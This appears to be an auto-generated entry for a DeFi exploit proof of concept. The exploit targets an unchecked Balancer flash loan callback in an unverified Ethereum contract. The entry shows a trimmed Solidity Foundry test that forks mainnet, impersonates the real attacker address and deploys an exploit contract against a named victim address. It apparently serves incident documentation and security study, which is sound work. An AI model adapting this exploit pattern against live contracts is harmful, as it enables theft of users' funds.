# [?] Unverified670471 - Unchecked Flash Loan Callback

## Summary
Severity: Unknown
Chain: Ethereum
Component: Unverified670471
Published: 2025-07-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/Unverified670471_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1,818.33

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0xe4B97Db5FAF476DB464Bc271097Fac97d6CE3783;
    uint256 private constant FORK_BLOCK = 23_006_171;
    uint256 private constant NET_ETH_PROFIT = 484_905_272_210_340_031;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        BalancerCallbackExploit exploit = new BalancerCallbackExploit(ATTACKER);
        exploit.execute();
        vm.stopPrank();

        assertEq(ATTACKER.balance - beforeBalance, NET_ETH_PROFIT, "ETH profit mismatch");
    }
}

contract BalancerCallbackExploit is IBalancerFlashLoanRecipient {
    address private constant VICTIM = 0x6704713B32CB1B3e89B0CF7D77417807061BdEB8;
    address private constant BRIBE_RECIPIENT = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;

    IBalancerVault private constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IWETHLike private constant WETH = IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant WBTC = IERC20Like(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/Unverified670471_exp.sol_
